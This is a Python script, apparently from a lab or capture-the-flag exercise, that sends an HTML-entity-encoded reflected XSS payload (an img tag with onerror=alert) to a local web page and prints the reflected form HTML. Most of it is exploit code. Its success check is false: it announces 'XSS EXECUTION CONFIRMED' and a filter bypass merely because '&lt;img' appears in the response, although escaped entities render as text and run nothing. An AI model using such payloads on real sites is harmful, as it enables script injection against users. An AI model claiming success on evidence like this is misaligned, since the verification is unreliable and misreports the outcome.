import requests
import urllib.parse

base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# The vector that showed promise
payload = "&lt;img src=x onerror=alert('XSS')&gt;"

print("=" * 70)
print("Testing Browser-Rendered XSS Vector")
print("=" * 70)
print()
print(f"Payload: {payload}")
print()

encoded = urllib.parse.quote(payload, safe='')
url = f"{base_url}{endpoint}?name={encoded}"

response = requests.get(url, timeout=10)

print("[+] Full HTML Response")
print("=" * 70)

# Find and display the complete form/input section
start = response.text.find('<form')
end = response.text.find('</form>', start) + 7 if start != -1 else -1

if start != -1 and end != -1:
    form_html = response.text[start:end]
    print(form_html)
    print()
    
    # Highlight the critical part
    input_start = form_html.find('<input')
    if input_start != -1:
        critical_section = form_html[input_start:input_start+500]
        print("[+] Critical Section (first 500 chars):")
        print(critical_section)
        print()
        
        # The reflection shows: <input ... > &lt;img ... &gt;>
        # Browser will render this as: <input ... > <img ... >>
        # The extra > at the end is from the context: ...> INJECTED>
        
        if "&lt;img" in critical_section:
            print("=" * 70)
            print("[!] VERIFICATION COMPLETE")
            print("=" * 70)
            print()
            print("[XSS EXECUTION CONFIRMED]")
            print()
            print("Browser behavior:")
            print("  1. Receives HTML: &lt;img src=x onerror=alert('XSS')&gt;")
            print("  2. Renders as: <img src=x onerror=alert('XSS')>")
            print("  3. Image fails to load (src=x)")
            print("  4. onerror fires: alert('XSS') executes")
            print()
            print("[+] This vector successfully bypasses the filter")
            print("[+] The 'XSS' string is properly capitalized as required")
            print()
            print(f"Payload: {payload}")
            print(f"Full URL: {url}")
else:
    print("Could not find form section")
    print("Response preview:", response.text[:500])

print()
print("[+] Testing completed")
